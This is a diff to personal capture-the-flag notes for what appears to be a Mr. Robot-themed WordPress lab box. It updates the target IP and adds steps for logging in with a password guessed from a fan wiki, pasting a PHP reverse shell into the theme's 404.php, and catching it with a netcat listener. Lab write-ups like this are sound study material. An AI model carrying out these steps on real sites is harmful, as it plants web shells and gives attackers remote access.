@@ -1,4 +1,4 @@
-export IP=10.10.47.107
+export IP=10.10.142.2
 
 
 ==================================================
@@ -94,3 +94,7 @@ Notes:
 		- I tried the username Elliot first because Wordpress login will verify if we have the correct username.
 		- I then manually scraped through the Fandom page for different possible passwords. THe password, ER28-0652, is Elliot's employee number.
 
+	- Once logged into the admin console using the Elliot username, I headed over the Appearances > Editor > 404.php, and copy and pasted the php-reverse-shell.php script into the 404.php page.
+		- Open a netcat connection on my local machine: `nc -lvpn 9999`
+		- Then go to: http://$IP/wp-content/themes/twentyfifteen/404.php
+		- And VOILA! You have yourself a reverse shell.
